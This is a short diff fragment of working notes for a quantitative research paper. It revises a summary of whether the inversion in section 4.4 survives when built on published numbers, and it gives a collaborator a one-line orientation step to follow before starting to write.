+that changed status this session: §4.4 now makes a claim in print — that the measure exists only
+where α > δ — whose empirical content nobody has established. That is no longer optional polish; it
+is the section's own open question, and the registered sample can answer it.
 
 ## 9 · ORIENT-THEN-GO
 
 Emit one line — `Oriented: <state> · at-bat: <X> · opening with <first action>.` — then start
 writing. Don't wait for the go, and ask for a ruling when you need one.
 
-*The question was whether a second series rescues the theorem. It does — and the answer arrived
-carrying a better one: the rescue's strength belongs to the asset, not the analyst, and it runs out
-in a few half-lives no matter how long anyone watches.* ⚒️
+*The question was whether §4.4's inversion survives being built on published numbers. It does not
+survive being built on anything: the ordering it rested on was doing all the work, and when you go
+looking for the numbers to replace that ordering, they turn out to live outside the model's domain
+entirely. The section is better for it — it now hands the reader a boundary instead of a table.* ⚒️
